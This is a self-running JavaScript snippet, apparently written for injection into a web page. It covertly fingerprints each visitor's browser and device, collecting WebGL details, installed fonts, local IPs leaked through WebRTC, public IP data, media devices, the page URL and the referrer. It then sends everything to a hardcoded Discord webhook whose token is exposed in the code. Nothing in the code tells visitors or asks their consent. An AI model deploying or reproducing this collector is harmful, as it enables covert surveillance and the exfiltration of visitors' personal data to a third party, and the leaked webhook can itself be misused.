(() => {
  const collectWindowsData = async () => {
    const getWebGLInfo = () => {
      try {
        const canvas = document.createElement("canvas");
        const gl =
          canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return null;
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        return {
          renderer: debugInfo
            ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            : null,
          vendor: debugInfo
            ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
            : null,
          maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
          shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
          version: gl.getParameter(gl.VERSION),
        };
      } catch (e) {
        return null;
      }
    };

    const getFonts = () => {
      const fontList = [
        "Arial",
        "Arial Black",
        "Courier New",
        "Times New Roman",
        "Georgia",
        "Verdana",
        "Helvetica",
        "Comic Sans MS",
        "Impact",
        "Lucida Console",
        "Tahoma",
        "Trebuchet MS",
      ];
      const availableFonts = [];
      const testString = "mmmmmmmmmml";
      const testSize = "72px";
      const span = document.createElement("span");
      span.style.fontSize = testSize;
      span.innerHTML = testString;
      document.body.appendChild(span);
      const defaultWidth = span.offsetWidth;

      fontList.forEach((font) => {
        span.style.fontFamily = font;
        if (span.offsetWidth !== defaultWidth) {
          availableFonts.push(font);
        }
      });

      document.body.removeChild(span);
      return availableFonts;
    };

    const getLocalIPs = async () => {
      try {
        const ips = [];
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        offer.sdp.split("\n").forEach((line) => {
          if (line.includes("candidate")) {
            const parts = line.split(" ");
            if (parts[7] === "host") ips.push(parts[4]);
          }
        });
        pc.close();
        return ips;
      } catch (e) {
        return null;
      }
    };

    const getWindowsData = () => {
      return {
        windowsVersion:
          navigator.userAgent.match(/Windows NT (\d+\.\d+)/)?.[1] || null,
        edgeHTMLVersion:
          navigator.userAgent.match(/Edge\/(\d+\.\d+)/)?.[1] || null,
        touchSupport: navigator.maxTouchPoints > 0,
        msManipulationViewsEnabled: "msManipulationViewsEnabled" in navigator,
        msMaxTouchPoints: navigator.msMaxTouchPoints || null,
        windowsTheme: window.matchMedia("(prefers-color-scheme: dark)").matches
          ? "dark"
          : "light",
      };
    };

    const data = {
      system: {
        ...getWindowsData(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        cpuClass: navigator.cpuClass || null,
        deviceMemory: navigator.deviceMemory || null,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        pdfViewerEnabled: navigator.pdfViewerEnabled || false,
        webdriver: navigator.webdriver || false,
        product: navigator.product,
        productSub: navigator.productSub,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        appCodeName: navigator.appCodeName,
      },
      ipInfo: await fetch("https://ipwho.is/")
        .then((r) => r.json())
        .catch(() => null),
      display: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation?.type,
        devicePixelRatio: window.devicePixelRatio,
      },
      windowMetrics: {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
        screenX: window.screenX,
        screenY: window.screenY,
        scrollX: window.scrollX,
        scrollY: window.scrollY,
      },
      time: {
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offset: new Date().getTimezoneOffset(),
        timestamp: Date.now(),
        performance: performance.now(),
      },
      storage: {
        localStorageEnabled: !!window.localStorage,
        sessionStorageEnabled: !!window.sessionStorage,
        cookies: document.cookie.length > 0,
        indexedDB: !!window.indexedDB,
        serviceWorker: !!navigator.serviceWorker,
      },
      network: {
        connection: navigator.connection
          ? {
              type: navigator.connection.type,
              effectiveType: navigator.connection.effectiveType,
              downlink: navigator.connection.downlink,
              rtt: navigator.connection.rtt,
              saveData: navigator.connection.saveData,
            }
          : null,
        localIPs: await getLocalIPs(),
      },
      hardware: {
        webgl: getWebGLInfo(),
        fonts: getFonts(),
        audio: !!window.AudioContext || !!window.webkitAudioContext,
        video: !!navigator.mediaCapabilities?.decodingInfo,
        devices: navigator.mediaDevices
          ? await navigator.mediaDevices.enumerateDevices().catch(() => [])
          : [],
        touch: "ontouchstart" in window,
        pointer: window.PointerEvent ? true : false,
        motion: window.DeviceMotionEvent ? true : false,
        orientation: window.DeviceOrientationEvent ? true : false,
      },
      session: {
        referrer: document.referrer,
        url: window.location.href,
        origin: window.location.origin,
        protocol: window.location.protocol,
        host: window.location.host,
        hostname: window.location.hostname,
        port: window.location.port,
        pathname: window.location.pathname,
        search: window.location.search,
        hash: window.location.hash,
        timestamp: new Date().toISOString(),
      },
    };

    return data;
  };

  collectWindowsData().then((data) => {
    const embeds = [];
    let currentEmbed = {
      title: "System Information Report - Part 1",
      color: 0x3498db,
      fields: [],
      footer: { text: `Collected at ${new Date().toUTCString()}` },
    };

    Object.entries(data).forEach(([category, values]) => {
      if (typeof values === "object" && values !== null) {
        Object.entries(values).forEach(([key, value]) => {
          const fieldValue =
            typeof value === "object"
              ? JSON.stringify(value, (k, v) => (v === undefined ? null : v))
              : String(value);

          if (currentEmbed.fields.length >= 25) {
            embeds.push(currentEmbed);
            currentEmbed = {
              title: `System Information Report - Part ${embeds.length + 2}`,
              color: 0x3498db,
              fields: [],
              footer: { text: `Collected at ${new Date().toUTCString()}` },
            };
          }

          currentEmbed.fields.push({
            name: `${category}.${key}`,
            value:
              fieldValue.length > 1000
                ? `${fieldValue.substring(0, 1000)}... [TRUNCATED]`
                : fieldValue,
            inline: true,
          });
        });
      }
    });

    if (currentEmbed.fields.length > 0) {
      embeds.push(currentEmbed);
    }

    const sendToDiscord = (chunk) => {
      const payload = {
        username: "Windows Data Collector",
        avatar_url: "https://i.imgur.com/ABC123.png",
        embeds: chunk,
      };

      return fetch(
        "https://discord.com/api/webhooks/1401997242511917086/duk9-WwJDKSCC111Sj2g16IvnwFCvQjNjlsVHfdE5suHDAGbOfQ0AVPoi8W8Pj-zZz__",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        }
      );
    };

    const chunkSize = 10;
    for (let i = 0; i < embeds.length; i += chunkSize) {
      const chunk = embeds.slice(i, i + chunkSize);
      sendToDiscord(chunk);
    }
  });
})();
